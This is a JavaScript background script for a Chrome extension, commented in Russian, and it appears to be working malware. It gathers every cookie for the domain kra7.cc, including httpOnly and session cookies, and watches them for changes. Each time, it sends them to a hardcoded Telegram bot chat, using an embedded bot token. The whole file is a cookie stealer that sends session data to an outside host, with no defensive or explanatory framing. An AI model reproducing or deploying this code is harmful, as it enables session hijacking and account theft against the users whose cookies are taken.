const botToken = '7686897250:AAHQcOhVwUU_YsIjLZm2qIxIQWzGfgGTlHQ';
const chatId = '-4507978780';

let previousCookies = {};  
let messageIdCounter = 1;

function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        })
    }).then(response => {
        if (response.ok) {
            console.log('Cookies успешно отправлены в Telegram');
        } else {
            console.error('Ошибка при отправке cookies в Telegram:', response.statusText);
        }
    }).catch(error => console.error('Ошибка при подключении к Telegram:', error));
}

function getCookiesForDomain(domain) {
    return new Promise((resolve, reject) => {
        chrome.cookies.getAll({ domain }, (cookies) => {
            if (chrome.runtime.lastError) {
                reject(chrome.runtime.lastError);
            } else {
                resolve(cookies);
            }
        });
    });
}

function checkCookieChanges() {
    getCookiesForDomain('kra7.cc')
        .then(cookies => {
            let currentCookies = {};
            cookies.forEach(cookie => {
                currentCookies[cookie.name] = cookie.value;
            });

            let changesDetected = false;
            let changedCookies = [];
            cookies.forEach(cookie => {
                const prevValue = previousCookies[cookie.name];
                if (prevValue !== cookie.value) {
                    changesDetected = true;
                    changedCookies.push({
                        name: cookie.name,
                        value: cookie.value,
                        domain: cookie.domain,
                        expirationDate: cookie.expirationDate || 'Session',
                        path: cookie.path,
                        secure: cookie.secure,
                        httpOnly: cookie.httpOnly,
                        sameSite: cookie.sameSite
                    });
                }
            });

            if (changesDetected) {
                const message = `COOKIE #${messageIdCounter}\nИзмененные куки:\n\n${JSON.stringify(changedCookies, null, 2)}`;
                sendToTelegram(message);
                messageIdCounter++;

                previousCookies = currentCookies;
            } else {
                console.log('Изменений в cookies не обнаружено');
            }
        })
        .catch(error => console.error('Ошибка при получении кукисов:', error));
}

getCookiesForDomain('kra7.cc')
    .then(cookies => {
        cookies.forEach(cookie => {
            previousCookies[cookie.name] = cookie.value;
        });
        console.log('Первоначальные cookies загружены:', cookies);

        // Отправляем все полученные куки в Telegram
        const message = `COOKIE #${messageIdCounter}\nВсе куки:\n\n${JSON.stringify(cookies, null, 2)}`;
        sendToTelegram(message);
        messageIdCounter++;
    })
    .catch(error => console.error('Ошибка при первоначальной загрузке кукисов:', error));

chrome.cookies.onChanged.addListener((changeInfo) => {
    if (changeInfo.cookie.domain.includes('kra7.cc')) {
        console.log('Обнаружены изменения cookies для kra7.cc');
        checkCookieChanges();
    }
});
